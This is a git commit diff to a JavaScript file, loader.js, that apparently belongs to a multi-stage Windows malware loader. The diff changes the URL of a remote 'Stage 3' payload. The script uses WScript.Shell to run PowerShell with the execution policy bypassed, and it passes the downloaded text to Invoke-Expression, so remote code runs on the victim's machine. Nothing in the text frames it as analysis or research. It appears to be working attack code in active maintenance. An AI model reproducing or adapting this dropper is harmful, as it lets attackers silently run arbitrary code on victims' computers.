9abd036de69c58506ed78fe0ebee4fbc00cc5c15
slnarefile <d.gallego1001@gmail.com>
2026-05-02 12:18:56 +0500

    Update loader.js

--- loader.js
+++ loader.js
@@ -2,7 +2,7 @@
 var wsh = new ActiveXObject("WScript.Shell");
 
 // Direct Stage 3 (working one)
-var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_bbffe3da6e264d9c96674b13b3ce34b3.txt";
+var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";
 
 var cmd = '-ep Bypass -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3Url + '\' -UseBasicParsing).Content"';
 
